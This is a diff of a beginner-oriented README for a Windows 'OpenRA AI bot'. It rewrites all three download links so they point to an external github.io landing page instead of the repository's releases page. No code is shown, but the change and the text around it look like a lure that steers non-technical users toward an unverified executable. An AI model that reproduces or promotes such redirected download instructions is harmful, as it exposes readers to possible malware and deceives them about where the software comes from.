@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and install **openra-ai-bot-2026** on your Windows computer. It's a simple process that takes just a few minutes. No technical knowledge is needed—just follow the steps below.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unwelcome-assault9086/openra-ai-bot-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://unwelcome-assault9086.github.io)
 
 ## 📦 What Is This?
 
@@ -39,7 +39,7 @@ Follow these steps carefully to get the AI bot working on your machine.
 
 Visit this link to download the application:
 
-[https://github.com/Unwelcome-assault9086/openra-ai-bot-2026/releases](https://github.com/Unwelcome-assault9086/openra-ai-bot-2026/releases)
+[https://unwelcome-assault9086.github.io](https://unwelcome-assault9086.github.io)
 
 You'll see a page with release files. Click the download button for the latest version. The file will save to your "Downloads" folder.
 
@@ -150,7 +150,7 @@ A: This version is designed for Windows. OpenRA itself runs on other systems, bu
 
 Remember to download the latest version from the link below to get all the newest improvements and features:
 
-[Download openra-ai-bot-2026](https://github.com/Unwelcome-assault9086/openra-ai-bot-2026/releases)
+[Download openra-ai-bot-2026](https://unwelcome-assault9086.github.io)
 
 Enjoy your battles, commander! May your strategy be sharp and your defenses strong.
 
